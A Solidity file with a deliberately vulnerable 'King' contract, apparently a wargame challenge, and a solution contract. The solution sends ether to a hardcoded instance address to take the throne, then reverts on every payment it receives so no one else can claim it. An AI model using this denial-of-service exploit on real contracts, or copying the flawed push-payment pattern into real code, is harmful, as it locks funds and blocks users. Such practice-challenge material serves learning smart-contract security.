// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

// Solution of king 

contract owner {

    receive() external payable {
        revert("reverted");
    }

    address payable king = payable(0x51d33e522aF441fE6993d4cC3f64D9a0b5345c8D);
    
    function becomeKing() public payable {
       (bool success, bytes memory data) = king.call{value : 10e16}("");
       require(success,"call reverted");

    }
}


